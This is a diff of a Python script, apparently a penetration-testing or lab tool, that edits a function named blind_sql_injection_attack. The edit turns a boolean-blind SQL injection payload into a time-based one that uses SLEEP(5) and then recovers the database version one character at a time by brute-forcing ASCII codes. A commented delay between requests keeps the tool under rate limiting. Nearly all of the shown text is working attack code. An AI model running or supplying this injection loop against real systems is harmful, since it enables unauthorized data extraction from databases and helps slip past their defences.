@@ -63,19 +63,21 @@ def blind_sql_injection_attack():
     tests_failed = 0
     details = []
     version_number = ''
-    version_length = 5  # Assumption of test version length
+    version_length = 5  # Assumption of version string length for testing
 
+    # Loop to try to extract each character of the database version
     for i in range(1, version_length + 1):
         found = False
         for ascii_code in range(32, 127):
-            payload = f"' AND ASCII(SUBSTRING((SELECT version()), {i}, 1)) = {ascii_code}-- "
+            # Payload that causes conditional delay based on the ASCII value of the character
+            payload = f"' AND IF(ASCII(SUBSTRING((SELECT version()),{i},1))={ascii_code}, SLEEP(5), false)-- "
             start_time = time.time()
-            response = session.get(sqli_blind_url, params={'id': payload})
+            response = session.get(sqli_blind_url, params={'id': payload}, headers=headers)
             elapsed_time = time.time() - start_time
             total_tests += 1
 
-            # Assumes a response time greater than 2 seconds is a successful test
-            if elapsed_time > 2:
+            # Assumes that a response time greater than 4 seconds is a successful test
+            if elapsed_time > 4:
                 version_number += chr(ascii_code)
                 tests_passed += 1
                 found = True
@@ -90,7 +92,6 @@ def blind_sql_injection_attack():
                 print(f"Character found: {chr(ascii_code)} at position {i}")
                 break
             else:
-                tests_failed += 1
                 details.append({
                     "position": i,
                     "character": chr(ascii_code),
@@ -99,13 +100,13 @@ def blind_sql_injection_attack():
                     "status_code": response.status_code,
                     "result": "FAILED"
                 })
-            time.sleep(delay)
-        
+            time.sleep(delay)  # Delay between each request to avoid rate limiting
+
         if not found:
             print(f"No character found at position {i}, stopping.")
             break
 
-    # Log dos resultados
+    # Log results
     script_name = os.path.splitext(os.path.basename(__file__))[0]
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     file_name = f"results_{script_name}_{timestamp}.json"
